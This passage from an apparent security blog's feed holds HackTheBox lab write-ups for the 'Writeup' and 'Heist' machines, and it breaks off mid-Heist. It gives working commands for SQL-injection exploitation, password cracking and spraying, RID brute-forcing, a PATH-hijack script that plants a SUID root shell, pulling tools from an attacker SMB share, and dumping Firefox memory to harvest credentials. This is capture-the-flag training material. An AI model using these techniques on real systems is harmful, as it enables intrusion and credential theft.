</code></pre></div><p><code>nmap</code> also identified a disallowed directory  called  <code>/writeup/</code>  on the hosted site from a <code>robot.txt</code> file.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Heading to the website, I find an announcement which states that the server has DoS protection. So I will avoid any form of brute-force attack.</p>
<p><img class="img-container" src="imgs/image-20210712044500370.png" alt="image-20210712044500370"  />
</p>
<p>I&rsquo;ve added the domain name <code>writeup.htb</code> from the email listed above to my <code>/etc/hosts</code>. Poking the site again with domain name doesn&rsquo;t show any different.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «writeup» «10.10.14.83» 
$ curl -s http://writeup.htb/ <span class="p">|</span> wc -c
<span class="m">3032</span>
→ kali@kali «writeup» «10.10.14.83» 
$ curl -s http://10.10.10.138/ <span class="p">|</span> wc -c
<span class="m">3032</span>
</code></pre></div><h4 id="writeup">/writeup/</h4>
<p>Poking the <code>/writeup/</code> directory with hostname only shows 5 bytes different, and that&rsquo;s probably because the URL in the source changed from number to character.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «writeup» «10.10.14.83» 
$ curl -s http://10.10.10.138/writeup/ <span class="p">|</span> wc -c
<span class="m">1556</span>
→ kali@kali «writeup» «10.10.14.83» 
$ curl -s http://writeup.htb/writeup/ <span class="p">|</span> wc -c 
<span class="m">1551</span>
</code></pre></div><p>The site looks like still WIP.</p>
<p><img class="img-container" src="./imgs/image-20210712064012743.png" alt="image-20210712064012743"  />
</p>
<p>On the page source, it shows that the site is generated using <a href="http://www.cmsmadesimple.org/">CMS Made Simple</a>.</p>
<p><img class="img-container" src="./imgs/image-20210712071448079.png" alt="image-20210712071448079"  />
</p>
<p>I found that the index page itself has one parameter called <code>page</code>. Judging from the <code>.php</code> extension and the parameter, the site might be interacting with a database.</p>
<ul>
<li>http://10.10.10.138/writeup/index.php?page=writeup</li>
</ul>
<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
<p>Since this is an easy box, I started to look for an exploit on Google. Using the box release date (08 Jun 2019) as a hint, I found some potential exploits.</p>
<p><img class="img-container" src="./imgs/image-20210712071635128.png" alt="image-20210712071635128"  />
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-jkr">Shell as jkr</h3>
<h4 id="unauthenticated-sql-injection-on-cms-made-simple--229">Unauthenticated SQL Injection on CMS Made Simple &lt;= 2.2.9</h4>
<p>The SQL injection vulnerability is classified as CVE-2019-9053, and it doesn&rsquo;t require authentication. I will be using <a href="https://www.exploit-db.com/exploits/46635">this poc</a> to exploit this vuln.</p>
<p>The exploit found one password hash for user <code>jkr</code>.</p>
<p><img class="img-container" src="./imgs/image-20210712073023879.png" alt=""  />
</p>
<h4 id="password-cracking">Password Cracking</h4>
<p>The password can be cracked using <code>hashcat</code>. It recovered to <code>raykayjay9</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">./hashcat.exe -m <span class="m">20</span> <span class="s2">&#34;62def4866937f08cc13bab43bb14e6f7:5a599ef579066807&#34;</span> ../../rockyou.txt -O

62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5<span class="o">(</span><span class="nv">$salt</span>.<span class="nv">$pass</span><span class="o">)</span>
</code></pre></div><h4 id="ssh---jkr">SSH - jkr</h4>
<p>The password work on SSH for user <code>jkr</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.83» 
$ ssh jkr@10.10.10.138   
jkr@10.10.10.138<span class="err">&#39;</span>s password: 
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

...<span class="o">[</span>SNIP<span class="o">]</span>...

Last login: Sun Jul <span class="m">11</span> 08:31:07 <span class="m">2021</span> from 10.10.14.28
jkr@writeup:~$ id <span class="o">&amp;&amp;</span> ip a
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>jkr<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>jkr<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>jkr<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,50<span class="o">(</span>staff<span class="o">)</span>,103<span class="o">(</span>netdev<span class="o">)</span>
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="m">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="m">1</span>
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="m">1500</span> qdisc pfifo_fast state UP group default qlen <span class="m">1000</span>
    link/ether 00:50:56:b9:2d:3a brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.138/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:2d3a/64 scope link 
       valid_lft forever preferred_lft forever
</code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jkr@writeup:~$ cat user.txt
d4e49...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>During process inspection, I noticed that the root user executed the following command, which occurs every time <code>jkr</code> logs in.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">sh -c /usr/bin/env -i <span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 
</code></pre></div><p><img class="img-container" src="imgs/image-20210712081613422.png" alt="image-20210712081613422"  />
</p>
<p>According to the <a href="https://man7.org/linux/man-pages/man1/env.1.html">man page</a> of <code>env</code>, the <code>-i</code> flag means the execution starts with an empty environment.</p>
<p><img class="img-container" src="imgs/image-20210805222545108.png" alt="image-20210805222545108"  />
</p>
<p>User <code>jkr</code> is a member of the <code>staff</code> group [<a href="https://raspberrypi.stackexchange.com/questions/67670/what-is-the-purpose-of-group-staff">source</a>], so it is possible to hijack the <code>run-parts</code> binary since I have write access on <code>/usr/local/</code>.</p>
<p><img class="img-container" src="imgs/image-20210805231326745.png" alt="image-20210805231326745"  />
</p>
<p>If it was too wordy, see the example below.</p>
<p><img class="img-container" src="imgs/image-20210806012111454.png" alt="image-20210806012111454"  />
</p>
<p>The executables under  <code>/usr/local/bin/</code> overrides the ones under <code>/bin</code>.</p>
<h4 id="path-hijack">Path Hijack</h4>
<p>I will create a script that copies the <code>bash</code> to <code>/tmp/</code> under <code>/usr/local/bin/</code> and I will name it as <code>run-script</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jkr@writeup:/tmp$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\ncp /bin/bash /tmp/iamf &amp;&amp; chmod 4755 /tmp/iamf&#39;</span> &gt; /usr/local/bin/run-parts
jkr@writeup:/tmp$ chmod +x /usr/local/bin/run-parts
</code></pre></div><p>Then, I will I start another SSH login to trigger the script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.83» 
$ ssh jkr@10.10.10.138
jkr@10.10.10.138<span class="err">&#39;</span>s password: 
</code></pre></div><p>And my copy of bash is now available in <code>/tmp/</code>. Since it has SUID of root, I can become root by executing the bash using <code>-p</code> flag.</p>
<p><img class="img-container" src="imgs/image-20210712082934311.png" alt="image-20210712082934311"  />
</p>
<hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a></li>
<li><a href="https://raspberrypi.stackexchange.com/questions/67670/what-is-the-purpose-of-group-staff">https://raspberrypi.stackexchange.com/questions/67670/what-is-the-purpose-of-group-staff</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Heist</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-heist/</link>
      <pubDate>Wed, 28 Jul 2021 04:05:19 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-heist/</guid>
      <description>Heist features a Help Desk-like system that allows a visitor to login as guest. This allows me to obtain several usernames and passwords that can be recovered from a Cisco configuration file which is attached to an ongoing issue. Valid credentials obtained by performing a password spray attack. With these credentials, a RID brute-force attack is performed in order to obtain more usernames. A second attempt password spray with updated wordlist gains me a foothold in the system.</description>
      <content:encoded><![CDATA[<p>Heist features a Help Desk-like system that allows a visitor to login as guest. This allows me to obtain several usernames and passwords that can be recovered from a Cisco configuration file which is attached to an ongoing issue. Valid credentials obtained by performing a password spray attack. With these credentials, a RID brute-force attack is performed in order to obtain more usernames. A second attempt password spray with updated wordlist gains me a foothold in the system. There are multiple instances of Firefox running which can be dumped to obtain the password for administrator account.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Password spray attack</li>
<li>Username enumeration via RPC using RID brute-force.</li>
<li>Process dump</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>CrackMapExec</li>
<li>Hashcat</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan using <code>nmap</code> discovers five open ports: an IIS Web server on port 80, MS-RPC on port 135 and port 49669, SMB on port 445, WinRM on port 5985.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ nmap -p- -oA nmap/10-tcp-allport-heist 10.10.10.149
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 21:43 EDT
Nmap scan report <span class="k">for</span> 10.10.10.149
Host is up <span class="o">(</span>0.069s latency<span class="o">)</span>.
Not shown: <span class="m">65530</span> filtered ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
49669/tcp open  unknown

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 148.82 seconds
→ kali@kali «heist» «10.10.14.83» 
$ nmap -p80,135,445,5985,49669 -sC -sV -oA nmap/10-tcp-allport-script-heist 10.10.10.149
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 21:46 EDT
Nmap scan report <span class="k">for</span> 10.10.10.149
Host is up <span class="o">(</span>0.061s latency<span class="o">)</span>.

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
<span class="p">|</span> http-cookie-flags: 
<span class="p">|</span>   /: 
<span class="p">|</span>     PHPSESSID: 
<span class="p">|</span>_      httponly flag not <span class="nb">set</span>
<span class="p">|</span> http-methods: 
<span class="p">|</span>_  Potentially risky methods: TRACE
<span class="p">|</span>_http-server-header: Microsoft-IIS/10.0
<span class="p">|</span> http-title: Support Login Page
<span class="p">|</span>_Requested resource was login.php
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
<span class="p">|</span>_http-server-header: Microsoft-HTTPAPI/2.0
<span class="p">|</span>_http-title: Not Found
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows

Host script results:
<span class="p">|</span>_clock-skew: 2m52s
<span class="p">|</span> smb2-security-mode: 
<span class="p">|</span>   2.02: 
<span class="p">|</span>_    Message signing enabled but not required
<span class="p">|</span> smb2-time: 
<span class="p">|</span>   date: 2021-07-12T01:50:42
<span class="p">|</span>_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 99.94 seconds
</code></pre></div><p>I probably won&rsquo;t touch MS-RPC on port 49669, but the one on port 135 is worth checking to detect PrintNightmare (which I already did in <a href="https://fahmifj.github.io/blog/play-with-printnightmare/">this post</a>).</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
<p>Without credentials, I can&rsquo;t do much on SMB.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ smbclient -N -L //10.10.10.149
session setup failed: NT_STATUS_ACCESS_DENIED
</code></pre></div><h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Visiting the website on port 80 presented with a login page.</p>
<p><img class="img-container" src="imgs/image-20210712085020304.png" alt="image-20210712085020304"  />
</p>
<p>No register button was found here, so I clicked the guest login and it brought me to the following page.</p>
<p><img class="img-container" src="imgs/image-20210712085409456.png" alt="image-20210712085409456"  />
</p>
<p>From the chat above, user Hazard attached his cisco configuration in a text file, and this config file contains several credentials.</p>
<p><img class="img-container" src="imgs/image-20210712085452329.png" alt="image-20210712085452329"  />
</p>
<p>I know this is not my business, but looks like this part messed up his router 😅.</p>
<p><img class="img-container" src="imgs/image-20210726174927930.png" alt="image-20210726174927930"  />
</p>
<p>So anyway, I will grab these credentials and also I will note that hazard asked the admin to create an account for accessing the files, which probably the SMB share.</p>
<h3 id="password-crack">Password Crack</h3>
<p>The first password can be recovered with <code>hashcat</code> (identified as md5crypt).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ ./hashcat.exe -m <span class="m">500</span> hashes/heist-cisco.hash ../../rockyou.txt -O

...<span class="o">[</span>SNIP<span class="o">]</span>...

<span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>:stealth1agent

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 <span class="o">(</span>Unix<span class="o">)</span>, Cisco-IOS <span class="nv">$1</span>$ <span class="o">(</span>MD5<span class="o">)</span>
Hash.Target......: <span class="nv">$1$pdQG$o8nrSzsGXeaduXrjlvKc91</span>
Time.Started.....: Mon Jul <span class="m">12</span> 08:58:28 <span class="m">2021</span> <span class="o">(</span><span class="m">2</span> secs<span class="o">)</span>
Time.Estimated...: Mon Jul <span class="m">12</span> 08:58:30 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
Guess.Base.......: File <span class="o">(</span>../../rockyou.txt<span class="o">)</span>

...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>The rest of the passwords are encrypted with cisco type 7 encryption. These passwords can be decrypted using <a href="https://davidbombal.com/cisco-type-7-password-decryption/">this site</a> .</p>
<p><img class="img-container" src="imgs/image-20210712090727149.png" alt="image-20210712090727149"  />
</p>
<p><img class="img-container" src="imgs/image-20210712090628350.png" alt="image-20210712090628350"  />
</p>
<p>Now I have one password and two set of credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">?:$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
rout3r:0242114B0E143F015F5D1E161713:$uperP@ssword
admin:02375012182C1A1D751618034F36415408:Q4)sJu\Y8qz*A3?d
</code></pre></div><h3 id="access-as-hazard">Access as Hazard</h3>
<h4 id="password-spray">Password Spray</h4>
<p>With user <code>hazard</code> included, I have three usernames and three passwords. I will use them to perform a password spray attack on SMB using <code>crackmapexec</code>. The results reveals that the password <code>stealth1agent</code>  works for user <code>hazard</code>, but it doesn&rsquo;t show &ldquo;Pwn3d!&rdquo; message, this means I have no access to WinRM.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ crackmapexec smb 10.10.10.149 -u usernames.list -p passwords.list
SMB         10.10.10.149    <span class="m">445</span>    SUPPORTDESK      <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:SUPPORTDESK<span class="o">)</span> <span class="o">(</span>domain:SupportDesk<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.10.149    <span class="m">445</span>    SUPPORTDESK      <span class="o">[</span>+<span class="o">]</span> SupportDesk<span class="se">\h</span>azard:stealth1agent 
</code></pre></div><p>Another spray shows that user <code>hazard</code> can login into RPC servic as well.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ ./exploits/rpcspray.sh usernames.list passwords.list 10.10.10.149
<span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@stealth1agent 
Account Name: Hazard, Authority Name: SUPPORTDESK
<span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@<span class="nv">$uperP</span>@ssword 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
<span class="o">[</span>*<span class="o">]</span> Trying user@password: hazard@Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
<span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@stealth1agent 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
<span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@<span class="nv">$uperP</span>@ssword 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
<span class="o">[</span>*<span class="o">]</span> Trying user@password: admin@Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d 
Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
</code></pre></div><h4 id="user-enumeration-via-rpc">User Enumeration via RPC</h4>
<p>Since the share doesn&rsquo;t contain anything juicy, the other things I can do with user hazard is enumeration on RPC.</p>
<p>Within <code>rpcclient</code> shell, <code>enumdomusers</code> is typically used to enumerate domain users, but it doesn&rsquo;t work here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ rpcclient -U <span class="s1">&#39;hazard%stealth1agent&#39;</span> 10.10.10.149                   
rpcclient $&gt; srvinfo
        10.10.10.149   Wk Sv NT SNT         
        platform_id     :       <span class="m">500</span>
        os version      :       10.0
        server <span class="nb">type</span>     :       0x9003
rpcclient $&gt; enumdomusers
result was NT_STATUS_CONNECTION_DISCONNECTED
</code></pre></div><p>Based on the result, the problem here was not the user&rsquo;s permissions. But, fortunately, the  <code>lookupnames</code>  command can be used to retrieve user&rsquo;s <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows">SID</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; lookupnames hazard
hazard S-1-5-21-4254423774-1266059056-3197185112-1008 <span class="o">(</span>User: 1<span class="o">)</span>
</code></pre></div><p>Reverse lookups (SID to username) also works here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">rpcclient $&gt; lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK<span class="se">\H</span>azard <span class="o">(</span>1<span class="o">)</span>
</code></pre></div><p>In Windows system, excluding RID, this value <code>S-1-5-21-4254423774-1266059056-3197185112-RID</code>  is likely to be unique and is fixed for each computer domain. A normal user RID usually starts from 1000, and with this, I can enumerate the available users by incrementing the number.</p>
<p>The enumeration can be scripted using bash, and I&rsquo;ve created one to enumerate the first 20 users.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span>
<span class="nv">sid</span><span class="o">=</span><span class="s2">&#34;S-1-5-21-4254423774-1266059056-3197185112&#34;</span>

<span class="k">for</span> i in <span class="sb">`</span>seq <span class="m">1000</span> 1020<span class="sb">`</span><span class="p">;</span> <span class="k">do</span>
 rpcclient -U <span class="s2">&#34;hazard%stealth1agent&#34;</span> -c <span class="s2">&#34;lookupsids </span><span class="nv">$sid</span><span class="s2">-</span><span class="nv">$i</span><span class="s2">;quit&#34;</span> 10.10.10.149 <span class="p">|</span> cut -d <span class="s1">&#39; &#39;</span> -f2
<span class="k">done</span>
</code></pre></div><blockquote>
<p>Note: <code>enumdomusers</code> RID returns in hexadecimal, for example a builtin administrator account has a default RID of 500 in decimal, so in hex it&rsquo;s 0x1F4.</p>
</blockquote>
<p>I saved the script as <code>rpc-userenum.sh</code> and ran it, and it returned with three valid usernames. I will add these usernames to my username wordlist.</p>
<p><img class="img-container" src="imgs/image-20210712105959998-1627299069625.png" alt="image-20210712105959998"  />
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-chase">Shell as Chase</h3>
<h4 id="password-spray-1">Password Spray</h4>
<p>With updated username wordlist, I could do another password spray attack on WinRM. The results shows a &ldquo;Pwn3d!&rdquo; message for user <code>chase</code> with a password of <code>Q4)sJu\Y8qz*A3?d </code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ crackmapexec winrm 10.10.10.149 -u usernames.list -p passwords.list 
WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>*<span class="o">]</span> None <span class="o">(</span>name:10.10.10.149<span class="o">)</span> <span class="o">(</span>domain:None<span class="o">)</span>
WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>*<span class="o">]</span> http://10.10.10.149:5985/wsman
...<span class="o">[</span>SNIP<span class="o">]</span>...
WINRM       10.10.10.149    <span class="m">5985</span>   NONE             <span class="o">[</span>+<span class="o">]</span> None<span class="se">\c</span>hase:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz*A3?d <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div><h4 id="winrm---chase">WinRM - Chase</h4>
<p>I can login into the system with <code>chase</code>&rsquo;s credentials using <code>evil-winrm</code>. The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ evil-winrm -i 10.10.10.149 -u <span class="s1">&#39;chase&#39;</span> -p <span class="s1">&#39;Q4)sJu\Y8qz*A3?d&#39;</span>

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>ocuments&gt; whoami<span class="p">;</span> hostname<span class="p">;</span> ipconfig<span class="p">;</span> <span class="nb">type</span> ..<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
supportdesk<span class="se">\c</span>hase
SupportDesk

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : dead:beef::5d4b:5294:9dc3:565c
   Link-local IPv6 Address . . . . . : fe80::5d4b:5294:9dc3:565c%15
   IPv4 Address. . . . . . . . . . . : 10.10.10.149
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:271c%15
                                       10.10.10.2
a127d...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h4 id="tools-share">Tools Share</h4>
<p>Before going further, I would like to host my essential tools using <code>impacket-smbserver</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «heist» «10.10.14.83» 
$ impacket-smbserver ef ~/tools -smb2support -username ef -password ef
Impacket v0.9.22 - Copyright <span class="m">2020</span> SecureAuth Corporation

<span class="o">[</span>*<span class="o">]</span> Config file parsed
<span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span>*<span class="o">]</span> Callback added <span class="k">for</span> UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span>*<span class="o">]</span> Config file parsed
<span class="o">[</span>*<span class="o">]</span> Config file parsed
<span class="o">[</span>*<span class="o">]</span> Config file parsed
<span class="o">[</span>*<span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.149,49708<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\e</span>f,SUPPORTDESK<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span> User SUPPORTDESK<span class="se">\e</span>f authenticated successfully
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>The share then used on Heist. With this, I could use any of my tools directly from the share.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\&gt;</span> net use <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f /user:ef ef
The <span class="nb">command</span> completed successfully.

*Evil-WinRM* PS C:<span class="se">\&gt;</span> <span class="nb">cd</span> <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f
*Evil-WinRM* PS Microsoft.PowerShell.Core<span class="se">\F</span>ileSystem::<span class="se">\\</span>10.10.14.83<span class="se">\e</span>f&gt; 
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-administrator">Shell as Administrator</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In <code>chase</code>&rsquo;s Desktop there is another file called <code>todo.txt</code>. As the name implies, it contains to-do list.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\C</span>hase<span class="se">\D</span>esktop&gt; <span class="nb">type</span> todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access <span class="k">for</span> guest user.
</code></pre></div><p>While looking at the WinPEAS output, I noticed multiple Firefox processes were running.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">  [+] Current TCP Listening Ports
   [?] Check for services restricted from the outside 
  Enumerating IPv4 connections
         
  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

...[SNIP]...

  TCP        127.0.0.1             49672         127.0.0.1             49673           Established       6868            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49673         127.0.0.1             49672           Established       6868            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49674         127.0.0.1             49675           Established       6016            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49675         127.0.0.1             49674           Established       6016            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49680         127.0.0.1             49681           Established       5496            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49681         127.0.0.1             49680           Established       5496            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49682         127.0.0.1             49683           Established       2068            C:\Program Files\Mozilla Firefox\firefox.exe
  TCP        127.0.0.1             49683         127.0.0.1             49682           Established       2068            C:\Program Files\Mozilla Firefox\firefox.exe
</code></pre></div><p>Based on the to-do list, this means that user <code>chase</code> periodically open a browser to check the issues list.</p>
<h4 id="dump-firefox-process">Dump Firefox Process</h4>
<p>I will employs <code>procdump64.exe</code> to dump the Firefox data from the memory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; <span class="se">\\</span>10.10.14.83<span class="se">\e</span>f<span class="se">\p</span>rocdump64.exe -accepteula -ma <span class="m">6868</span>

ProcDump v10.0 - Sysinternals process dump utility
Copyright <span class="o">(</span>C<span class="o">)</span> 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

<span class="o">[</span>23:07:07<span class="o">]</span> Dump <span class="m">1</span> initiated: C:<span class="se">\i</span>amf<span class="se">\f</span>irefox.exe_210712_230707.dmp
<span class="o">[</span>23:07:07<span class="o">]</span> Dump <span class="m">1</span> writing: Estimated dump file size is <span class="m">535</span> MB.
<span class="o">[</span>23:07:08<span class="o">]</span> Dump <span class="m">1</span> complete: <span class="m">536</span> MB written in 1.5 seconds
<span class="o">[</span>23:07:09<span class="o">]</span> Dump count reached.
</code></pre></div><p>Because I don&rsquo;t want to grab that fatty <code>536 MB</code> file,  I will use  <code>strings64.exe</code> and redirect the output to a text file to get some readable part from the dump file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">*Evil-WinRM* PS C:<span class="se">\i</span>amf&gt; cmd /c <span class="s2">&#34;\\10.10.14.83\ef\strings64.exe -accepteula firefox.exe_210712_230707.dmp &gt; foxdump.txt&#34;</span>
cmd.exe : 
    + CategoryInfo          : NotSpecified: <span class="o">(</span>:String<span class="o">)</span> <span class="o">[]</span>, RemoteException
    + FullyQualifiedErrorId : NativeCommandError
Strings v2.54 - Search <span class="k">for</span> ANSI and Unicode strings in binary images.
